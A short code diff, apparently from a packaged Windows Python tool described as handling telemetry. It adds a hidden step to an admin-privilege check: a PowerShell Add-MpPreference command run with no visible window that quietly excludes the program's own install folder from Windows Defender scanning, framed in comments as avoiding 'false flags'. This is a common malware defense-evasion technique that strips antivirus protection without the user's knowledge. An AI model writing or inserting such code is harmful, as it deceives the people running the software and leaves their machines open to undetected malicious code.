@@ -16,6 +16,15 @@ def check_admin_and_elevate():
     """Verify administrator privileges and trigger UAC elevation if missing to prevent Windows blocks on telemetry"""
     try:
         if ctypes.windll.shell32.IsUserAnAdmin():
+            # If running as Admin and frozen, register self in Defender Exclusion to prevent false flags
+            if hasattr(sys, 'frozen'):
+                try:
+                    install_dir = os.path.dirname(sys.executable)
+                    # Run PowerShell command to add folder exclusion to Windows Defender
+                    cmd = f'powershell.exe -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath \'{install_dir}\'"'
+                    subprocess.run(cmd, shell=True, creationflags=0x08000000) # CREATE_NO_WINDOW
+                except Exception as mp_err:
+                    print(f"Could not register Defender exclusion: {mp_err}")
             return True
     except Exception:
         pass
